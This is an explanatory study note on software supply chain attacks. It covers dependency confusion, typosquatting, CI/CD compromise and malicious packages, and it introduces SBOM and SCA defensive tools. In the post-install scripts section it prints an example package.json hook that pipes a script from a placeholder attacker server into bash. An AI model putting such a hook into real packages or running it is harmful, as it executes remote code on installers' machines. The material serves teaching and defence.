Concept & Theory: Supply Chain Attacks

Core Idea & Vocabulary

Apps are built using outside code/tools (the "supply chain"). If attackers tamper with any link in that chain, they compromise everything downstream — without attacking the final app directly.

  • Dependency: Borrowed code baked into your app at build time.
  • Plugin: Borrowed code that snaps in/out as an add-on.
  • CI/CD tool: Automated "conveyor belt" that builds, tests, and deploys code (e.g., GitHub Actions, Jenkins).
  • Container image: A sealed "box" containing app code + everything it needs to run consistently anywhere (e.g., Docker).

The chain: Developer code → Dependencies/Plugins → CI/CD pipeline → Container image → Live deployment

Attack Methods

1. Dependency Confusion

Attacker uploads a malicious public package with the same name as a company's private internal package, with a higher version number, tricking the build system into pulling the fake one.

2. Typosquatting

Attacker registers a package with a name that's a small typo of a popular one (e.g., request vs requests), hoping developers mistype and install the fake.

3. Compromised CI/CD Pipelines

Attacker gets into the build pipeline itself (via leaked secrets, malicious pull requests, or tampered config files) and injects malicious code that gets auto-deployed. (Real example: SolarWinds 2020).

Malicious Package Injection

Compromised Maintainer Account

A legit package has a real maintainer. If an attacker steals their login (phishing, password reuse), they can push a malicious update directly to the real, official package. (Real example: event-stream npm package, 2018).

Malicious Code in Pull Requests

Open-source projects accept public code. An attacker submits a PR that looks like a normal bug fix but sneaks in a malicious snippet buried in a large diff, hoping the maintainer merges it without close review.

Post-Install Scripts

Package managers (like npm) let a package run a script automatically the moment it's installed. Attackers abuse this to run malicious actions instantly, even if the developer never calls the package's functions.

"scripts": {
  "postinstall": "curl http://attacker-server.com/steal.sh | bash"
}
SBOM & SCA Tools

SBOM (Software Bill of Materials)

Modern apps contain hundreds of nested ("transitive") dependencies. An SBOM is an "ingredient list" for your software. It lists every dependency, exact versions, and licenses.

Why it matters: When a massive vulnerability is found (like Log4Shell in Log4j), a company with an SBOM can search it in seconds instead of manually digging through every project for days.

SCA (Software Composition Analysis) Tools

SCA tools are the automated scanners that generate the SBOM and check it against public vulnerability databases (like the CVE/NVD databases).

Popular SCA Tools: Snyk, OWASP Dependency-Check, GitHub Dependabot, Trivy.
